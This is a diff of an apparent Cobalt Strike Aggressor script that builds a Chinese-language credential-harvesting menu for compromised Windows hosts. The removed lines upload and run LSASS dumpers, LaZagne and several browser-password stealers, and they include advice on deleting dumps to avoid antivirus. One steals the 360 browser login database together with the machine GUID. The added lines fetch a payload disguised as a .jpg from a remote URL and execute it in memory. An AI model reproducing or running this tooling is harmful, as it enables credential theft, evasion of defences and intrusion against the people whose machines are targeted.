@@ -1,3 +1,4 @@
+include(script_resource("config"));
 menu "☆ 凭据获取" {
   menu "Mimikatz 相关" {
     item "Logonpasswords" {
@@ -183,37 +184,6 @@ menu "☆ 凭据获取" {
   }
 
   menu "DumpHash 相关" {
-    menu "LsassDump (WinAPI)" {   # https://github.com/Ryze-T/Windows_API_Tools
-      item "上传 LsassDump" {
-        blog($1, "\c9=========== 上传 LsassDump ==========");
-        $bid = $1;
-        $dialog = dialog("上传 LsassDump", %(UploadPath => "C:\\Windows\\Temp\\", bid => $bid), &LDupload);
-        dialog_description($dialog, "使用 WindowsAPI 读取 lsass.exe，为保证免杀效果请Dump成功后及时删除!");
-        drow_text($dialog, "UploadPath",  "上传路径: ");
-        dbutton_action($dialog, "上传");
-        dialog_show($dialog);
-      }
-      sub LDupload{
-        bcd($bid, $3['UploadPath']);
-        if (-is64 $bid['id']) {
-          bupload($bid, script_resource("/scripts/PassCapture/LsassDump/x64/LsassDump.exe"));
-        }else{
-          bupload($bid, script_resource("/scripts/PassCapture/LsassDump/x86/LsassDump.exe"));
-        }
-        btask($bid, "使用 WindowsAPI 读取 lsass.exe，为保证免杀效果请Dump成功后及时删除！");
-      }   
-      item "运行 LsassDump" {
-        blog($1, "\c9=========== 运行 LsassDump ==========");
-        bshell($bid, "LsassDump.exe");
-      }
-      item "删除 LsassDump" {
-        blog($1, "\c9=========== 删除 LsassDump ==========");
-        local('$bid');
-        foreach $bid ($1){
-          bshell($1, "taskkill -f /im LsassDump.exe & del /f /s /q LsassDump.exe & del /f /s /q 1.dmp");
-        }
-      }
-    }
     item "SharpMimidump（远程读取.dmp）" {
         blog($1, "\c9=========== SharpMimidump（远程读取.dmp） =========="); # https://github.com/cube0x0/Mimidump
       btask($bid, "使用 Mimidump 远程读取转储的 C:\\Windows\\Temp\\1.dmp（.net 4.5）");
@@ -257,157 +227,11 @@ menu "☆ 凭据获取" {
   }  
   separator();
 
-	menu "LaZagne 检索主机密码" {
-    item "上传 LaZagne" {
-			blog($1, "\c9=========== 上传 LaZagne ==========");
-      $bid = $1;
-      $dialog = dialog("上传 lazagne", %(UploadPath => "C:\\Windows\\Temp\\", bid => $bid), &lazagne);
-      dialog_description($dialog, "LaZagne 不免杀，请在无AV的机器上运行。项目地址：https://github.com/AlessandroZ/LaZagne");
-      drow_text($dialog, "UploadPath",  "上传路径: ");
-      dbutton_action($dialog, "上传");
-      dialog_show($dialog);
-    }
-    sub lazagne{
-      bcd($bid, $3['UploadPath']);
-			bupload($bid, script_resource("/scripts/PassCapture/lazagne.exe"));
-    }
-    item "运行 LaZagne" {
-			blog($1, "\c9=========== 运行 LaZagne ==========");
-      bshell($bid, "lazagne.exe all");
-    }
-    item "删除 LaZagne" {
-			blog($1, "\c9=========== 删除 LaZagne ==========");
-      local('$bid');
-      foreach $bid ($1){
-        bshell($1, "taskkill -f /im lazagne.exe & del /f /s /q lazagne.exe");
-        bshell($bid, "del C:\\Windows\\Temp\\lazagne.exe");
-      }
-    }
-  }
-
-  menu "抓取浏览器数据及密码" {
-    menu "HackBrowserData" { 
-      item "上传 HackBrowserData" {
-			blog($1, "\c9=========== 上传 HackBrowserData ==========");
-        $bid = $1;
-        $dialog = dialog("上传 HackBrowserData", %(UploadPath => "C:\\Windows\\Temp\\", bid => $bid), &hack-browser-data);
-        dialog_description($dialog, "全平台支持，软件地址：https://github.com/moonD4rk/HackBrowserData");
-        drow_text($dialog, "UploadPath",  "上传路径: ");
-        dbutton_action($dialog, "上传");
-        dialog_show($dialog);
-      }
-      sub hack-browser-data {
-        bcd($bid, $3['UploadPath']);
-        if (-is64 $bid['id']) {
-          bupload($bid, script_resource("/scripts/PassCapture/HackBrowserData/x64/hack-browser-data.exe"));
-        }else{
-          bupload($bid, script_resource("/scripts/PassCapture/HackBrowserData/x86/hack-browser-data.exe"));
-        }         
-      }
-
-      item "运行 HackBrowserData" {
-			blog($1, "\c9=========== 运行 HackBrowserData ==========");
-        $bid = $1['@'];
-        $Dialog = dialog("运行 HackBrowserData",%(bid => $bid),&hack-browser-data_run);
-        dialog_description($Dialog, "运行后会在当前目录下生成results文件夹，所有结果都在里面");
-        dbutton_action($Dialog, "运行");
-        btask($bid, "运行后会在当前目录下生成results文件夹，所有结果都在里面", "");
-        dialog_show($Dialog);
-        
-      }
-      sub hack-browser-data_run{
-        bshell($bid, "hack-browser-data.exe");
-      }
-
-      item "删除 exe 及 resuls 文件夹" {
-			blog($1, "\c9=========== 删除 exe 及 resuls 文件夹 ==========");
-        local('$bid');
-        foreach $bid ($1){
-          bshell($1, "del /f /s /q hack-browser-data.exe && rmdir /s /q results");
-        }
-      }
-    }
-    menu "360SafeBrowsergetpass" {
-      sub getMachineGuid{
-        $arch = barch($1);
-        if ($arch == 'x64'){
-        breg_queryv($1, "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Cryptography", "MachineGuid", "x64");
-        }
-        else{
-        breg_queryv($1, "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Cryptography", "MachineGuid", "x86");
-        breg_queryv($1, "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Cryptography", "MachineGuid", "x64");
-        }
-      }
-
-      sub SafeBrowsergetpass {
-        bshell($bid, 'reg query HKEY_CLASSES_ROOT\360seURL\shell\open\command|findstr exe');
-      }
-
-      item "查询相关键值"{
-          $bid = $1['@'];
-          SafeBrowsergetpass($bid);
-          getMachineGuid($bid);
-      }
-
-      on beacon_output {
-        $magicstring = "360se6\\Application\\360se.exe";
-        $magicstring2 = "MachineGuid";
-
-        if ($magicstring isin $2){
-        $length = strlen($2);
-        $last = lindexOf($2, ":");
-        $res = substr($2, $last - 1, $length - 32);
-        $dbPath = "User Data\\Default\\apps\\LoginAssis\\assis2.db";
-        $res = $res . $dbPath;
-
-        bdownload($1, $res);
-        blog($1,"360 SafeBrowser DB Downloading");
-        }
-
-        if ($magicstring2 isin $2){
-        $lasta = lindexOf($2, "\nMachineGuid");
-        $MachineGuid = substr($2, $lasta + 26, -1); 
-        $beaconHost = beacon_info($1, "host");
-        credential_add($empty,$MachineGuid, $empty, $empty, $beaconHost);
-        blog($1,"MachineGuid Get Success");
-        }
-      }
-
-      item "Safe360Browsergetpass" {
-        blog($1, "\c9=========== Safe360Browsergetpass ==========");
-        blog($1, "项目地址：https://github.com/hayasec/360SafeBrowsergetpass")
-        bexecute_assembly($1, script_resource("/scripts/PassCapture/Safe360Browsergetpass.exe"),"/auto");      
-      }
-    }
-    item "BrowserGhost" {
-			blog($1, "\c9=========== BrowserGhost ==========");
-      blog($1, "项目地址：https://github.com/QAX-A-Team/BrowserGhost")
-      bexecute_assembly($1, script_resource("/scripts/PassCapture/BrowserGhost.exe"));
-    }
-    item "SharpWeb" {
-			blog($1, "\c9=========== SharpWeb ==========");
-      $bid = $1['@'];
-      $dialog = dialog("SharpChromium", %(bid => $bid), &SharpWeb);
-      dialog_description($dialog,"可从Google Chrome，Mozilla Firefox和Microsoft Internet Explorer/Edge检索保存的浏览器凭据。项目地址：https://github.com/djhohnstein/SharpWeb");
-      drow_combobox($dialog, "Type", "all/chrome/firefox/edge", @("all", "chrome","firefox","edge"));
-      dbutton_action($dialog, "运行");
-      dialog_show($dialog);
-    }
-    sub SharpWeb {
-      bexecute_assembly($bid, script_resource("/scripts/PassCapture/SharpWeb.exe"), $3['Type']);
-    }
-    item "SharpChromium" {
-			blog($1, "\c9=========== SharpChromium ==========");
-      $bid = $1['@'];
-      $dialog = dialog("SharpChromium", %(bid => $bid), &SharpChromium);
-      dialog_description($dialog,".NET 4.0 CLR项目，用于检索Chromium数据，如Cookie、历史记录和保存的登录名。项目地址：https://github.com/djhohnstein/SharpChromium");
-      drow_combobox($dialog, "Type", "all/cookies/history/logins", @("all", "cookies","history","logins"));
-      dbutton_action($dialog, "运行");
-      dialog_show($dialog);
-    }
-    sub SharpChromium {
-      bexecute_assembly($bid, script_resource("/scripts/PassCapture/SharpChromium.exe"), $3['Type']);
-    }   
+  item "HackBrowserData" {
+    blog($1, "\c9=========== 运行HackBrowserData(结果在temp路径下) ==========");
+    $exe = script_resource("/scripts/DInvoke.exe");
+    $param = "--url " . $url . "/PassCapture/x64/HackBrowserData.jpg";
+    bexecute_assembly!($bid, $exe, $param);
   }
 
   menu "主机程序相关密码" {
